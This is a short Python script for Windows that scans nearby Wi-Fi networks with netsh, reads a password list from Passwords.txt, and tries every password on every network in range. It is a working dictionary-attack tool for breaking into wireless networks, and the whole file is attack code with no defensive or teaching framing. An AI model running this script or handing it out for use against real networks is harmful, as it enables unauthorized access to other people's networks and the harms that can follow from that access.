import subprocess
import sys

from winwifi import WinWiFi


class AutoWifi:

    def __init__(self):
        self.passwords = None
        self.ssids = None

    def set_networks(self):
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'network']).decode().split("\n")
        except UnicodeDecodeError:
            print("Unicode Character Error")
            sys.exit()

        ssids = []
        for i in results:
            if "SSID" in i and len(i) > 10:
                ssids.append(i.rstrip()[9:])
        if ssids is None:
            print("No Valid Networks In Range")
            sys.exit()
        else:
            self.ssids = ssids
            print("Networks Successfully Loaded ")

    def load_passwords(self):
        passwords = []
        with open('Passwords.txt') as fp:
            for cnt, line in enumerate(fp):
                passwords.append(line.rstrip())
        self.passwords = passwords
        print("Passwords Successfully Loaded")

    def attempt_connection(self):
        for i in self.ssids:
            for j in self.passwords:
                WinWiFi.connect(ssid=i, passwd=j, remember=False)
                print(i, j)


a = AutoWifi()
a.set_networks()
a.load_passwords()
a.attempt_connection()
